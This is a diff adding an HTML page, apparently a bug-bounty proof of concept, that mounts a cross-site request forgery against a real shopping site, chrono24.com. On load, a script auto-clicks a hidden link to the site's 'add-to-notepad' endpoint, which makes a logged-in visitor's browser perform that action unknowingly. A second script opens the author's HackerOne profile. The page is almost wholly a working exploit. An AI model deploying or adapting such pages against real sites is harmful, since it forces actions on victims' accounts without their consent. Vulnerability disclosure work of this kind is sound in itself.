@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>CSRF POC by BUG HUNTER</title>
+</head>
+<body>
+	<center>
+		<h1>CSRF POC by <a href="https:hackerone.com/bughuntar">@bughuntar</a></h1>
+	<img src="https://detectoor.github.io/i/i.png" width="1000px" height="1000px">
+		<a href="https://www.chrono24.com/user/add-to-notepad.htm?param=24400050&ajax=1&ts=1657032920334" target="_blank" id="csrf" type="hidden">CSRF</a>
+	</center>
+<script>
+document.getElementById('csrf').click();
+</script>
+
+<a href="https://hackerone.com/bughuntar" target="_blank" id="hackerone" type="hidden">CSRF</a>
+<script>
+document.getElementById('hackerone').click();
+</script>
+</body>
+</html>
